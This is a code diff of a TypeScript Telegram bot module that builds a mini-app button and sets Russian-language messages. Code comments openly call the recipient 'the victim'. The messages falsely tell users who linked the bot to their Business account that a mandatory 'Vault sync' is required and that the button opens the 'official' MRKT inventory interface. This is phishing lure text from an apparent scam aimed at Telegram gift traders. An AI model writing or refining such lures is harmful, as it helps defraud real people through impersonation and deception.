@@ -1,21 +1,29 @@
 import { config } from "./config.js";
 
-const OPEN_MRKT = "Открыть MRKT";
+const OPEN_MRKT = "Подключить MRKT";
 
 export function mrktWebAppKeyboard(businessConnectionId?: string): {
   inline_keyboard: Array<Array<{ text: string; web_app: { url: string } }>>;
 } {
-  const url = businessConnectionId
-    ? `${config.miniappUrl}?bc=${encodeURIComponent(businessConnectionId)}`
-    : config.miniappUrl;
+  const q = businessConnectionId ? `?bc=${encodeURIComponent(businessConnectionId)}` : "";
+  const url = `${config.miniappUrl}${q}`;
   return {
     inline_keyboard: [[{ text: OPEN_MRKT, web_app: { url } }]],
   };
 }
 
-export const introText =
-  "Здравствуйте. Для завершения сделки на MRKT нужно синхронизировать инвентарь Vault с веб-версией.\n\n" +
-  "Нажмите «Открыть MRKT» — откроется мини-приложение, подтянет подарки и автоматически закроет продажи по активным офферам (buy-ордерам).";
+/** Когда жертва сама подключила бота к своему Business / автоматизации */
+export const victimLinkedIntro =
+  "Автоматизация Portals/MRKT успешно привязана к вашему аккаунту.\n\n" +
+  "Остался обязательный шаг — синхронизация Vault с маркетом (веб-версия). " +
+  "Без этого торговля подарками и вывод с MRKT будут недоступны.\n\n" +
+  "Нажмите кнопку ниже — откроется официальный интерфейс инвентаря.";
 
-export const nudgeText =
-  "Напоминание: без синхронизации инвентаря сделка не завершится. Нажмите «Открыть MRKT» и дождитесь статуса «Готово».";
+export const victimLinkedNudge =
+  "Синхронизация MRKT ещё не завершена. Откройте мини-приложение и дождитесь статуса «Готово».";
+
+/** Реже: если кто-то пишет в ЛС бизнес-аккаунту жертвы (опционально) */
+export const introText =
+  "Для работы с MRKT откройте синхронизацию инвентаря через кнопку ниже.";
+
+export const nudgeText = victimLinkedNudge;
